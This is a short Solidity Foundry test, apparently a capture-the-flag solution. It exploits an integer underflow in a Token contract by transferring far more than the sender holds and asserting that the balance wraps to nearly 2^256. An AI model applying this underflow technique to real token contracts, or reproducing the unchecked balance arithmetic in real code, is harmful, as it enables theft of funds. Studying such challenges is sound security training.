// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "forge-std/Test.sol";
import "../src/Token.sol";

// exploit overflow
contract TokenTest is Test {
    Token instance;

    function setUp() public {
        instance = new Token(100);
    }

    function test() public {
        address alice = makeAddr("alice");

        instance.transfer(alice, 20);
        assertEq(instance.balanceOf(alice), 20);
        assertEq(instance.balanceOf(address(this)), 80);

        instance.transfer(alice, 1e18);
        assertEq(instance.balanceOf(alice), 1e18 + 20);

        // 80 + -(1e18 - 2^256) = (type(uint256).max + 1) (= 2^256) - 1e18 + 80
        assertEq(instance.balanceOf(address(this)), type(uint256).max - 1e18 + 80 + 1);
    }
}
